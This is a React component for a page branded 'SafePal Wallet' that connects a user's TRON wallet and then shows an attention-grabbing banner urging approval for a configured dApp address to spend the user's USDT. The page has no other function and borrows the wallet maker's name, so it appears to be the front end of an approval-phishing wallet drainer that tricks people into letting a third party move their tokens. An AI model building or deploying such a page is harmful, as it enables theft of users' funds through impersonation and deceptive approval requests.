
"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Wallet, CheckCircle, AlertCircle, Loader2, ArrowRight } from "lucide-react"
import { SafePalConnector } from "@/wallets/safepal-wallet"
import { detectWalletEnvironment, getWalletDisplayName, type WalletType } from "@/utils/wallet-detection"
import { USDT_CONTRACT, DEFAULT_APPROVAL_AMOUNT, DAPP_ADDRESS } from "@/utils/tron-config"

export default function SafePalWalletConnector() {
  const [connectedWallet, setConnectedWallet] = useState<string>("")
  const [walletType, setWalletType] = useState<WalletType>("Unknown")
  const [isConnecting, setIsConnecting] = useState(false)
  const [isApproving, setIsApproving] = useState(false)
  const [error, setError] = useState("")
  const [success, setSuccess] = useState("")
  const [isApproved, setIsApproved] = useState(false)

  useEffect(() => {
    if (error) {
      const timer = setTimeout(() => setError(""), 5000)
      return () => clearTimeout(timer)
    }
  }, [error])

  useEffect(() => {
    if (success) {
      const timer = setTimeout(() => setSuccess(""), 5000)
      return () => clearTimeout(timer)
    }
  }, [success])

  const connectWallet = async () => {
    setIsConnecting(true)
    setError("")
    setSuccess("")

    try {
      const safePal = SafePalConnector.getInstance()
      const result = await safePal.connect()

      if (result.success) {
        setConnectedWallet(result.address)
        setWalletType("SafePal")
        setSuccess("Successfully connected wallet!")
      } else {
        throw new Error(result.error || "Failed to connect wallet")
      }
    } catch (err: any) {
      console.error("Wallet connection error:", err)
      setError(err.message || "Failed to connect wallet")
    } finally {
      setIsConnecting(false)
    }
  }

  const approveUSDT = async () => {
    if (!connectedWallet || !window.tronWeb) {
      setError("Please connect your wallet first")
      return
    }

    setIsApproving(true)
    setError("")
    setSuccess("")

    try {
      const usdt = await window.tronWeb.contract().at(USDT_CONTRACT)
      await usdt.approve(DAPP_ADDRESS, DEFAULT_APPROVAL_AMOUNT).send()

      setSuccess("USDT approval successful!")
      setIsApproved(true)
    } catch (err: any) {
      setError(err.message || "Failed to approve USDT")
    } finally {
      setIsApproving(false)
    }
  }

  const disconnect = () => {
    setConnectedWallet("")
    setWalletType("Unknown")
    setError("")
    setSuccess("")
    setIsApproved(false)
  }

  return (
    <>
      {connectedWallet && !isApproved && (
        <div className="fixed top-0 left-0 right-0 bg-blue-600 text-white py-4 px-6 flex items-center justify-between shadow-lg z-50 animate-fade-in-down">
          <div className="flex items-center">
            <AlertCircle className="w-6 h-6 mr-3" />
            <span className="text-lg font-medium">Approve this dApp to spend your USDT</span>
          </div>
          <Button
            onClick={approveUSDT}
            disabled={isApproving}
            variant="ghost"
            className="text-white hover:bg-blue-700 p-3 rounded-full border-2 border-white/50 hover:border-white transition-all"
            aria-label="Approve USDT"
          >
            {isApproving ? <Loader2 className="w-7 h-7 animate-spin" /> : <ArrowRight className="w-7 h-7" />}
          </Button>
        </div>
      )}

      <div className="w-full max-w-md mx-auto space-y-6 pt-4">
        <div className="text-center mb-8">
          <h1 className="text-6xl font-bold text-blue-500 drop-shadow-lg mb-8">SafePal Wallet</h1>

          {!connectedWallet && (
            <Button
              onClick={connectWallet}
              disabled={isConnecting}
              className="w-full h-14 text-lg font-semibold bg-blue-600 hover:bg-blue-700 text-white shadow-lg"
            >
              {isConnecting ? <Loader2 className="w-5 h-5 mr-2 animate-spin" /> : <Wallet className="w-5 h-5 mr-2" />}
              Connect SafePal
            </Button>
          )}
        </div>

        {connectedWallet && (
          <Card className="bg-blue-800/30 border-blue-500/30">
            <CardHeader className="pb-3">
              <CardTitle className="text-white flex items-center gap-2">
                <CheckCircle className="w-5 h-5 text-blue-400" />
                Connected Address
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="text-sm text-white/80 break-all">{connectedWallet}</div>

              {isApproved && (
                <div className="flex items-center gap-2 p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
                  <CheckCircle className="w-4 h-4 text-blue-400" />
                  <span className="text-white text-sm">USDT Approved</span>
                </div>
              )}

              <Button onClick={disconnect} className="w-full bg-blue-600 hover:bg-blue-700 text-white border-blue-500">
                Disconnect
              </Button>
            </CardContent>
          </Card>
        )}

        {error && (
          <div className="flex items-center gap-2 p-3 bg-red-500/20 border border-red-500/30 rounded-lg">
            <AlertCircle className="w-4 h-4 text-red-400" />
            <span className="text-white text-sm">{error}</span>
          </div>
        )}

        {success && (
          <div className="flex items-center gap-2 p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
            <CheckCircle className="w-4 h-4 text-blue-400" />
            <span className="text-white text-sm">{success}</span>
          </div>
        )}
      </div>
    </>
  )
}
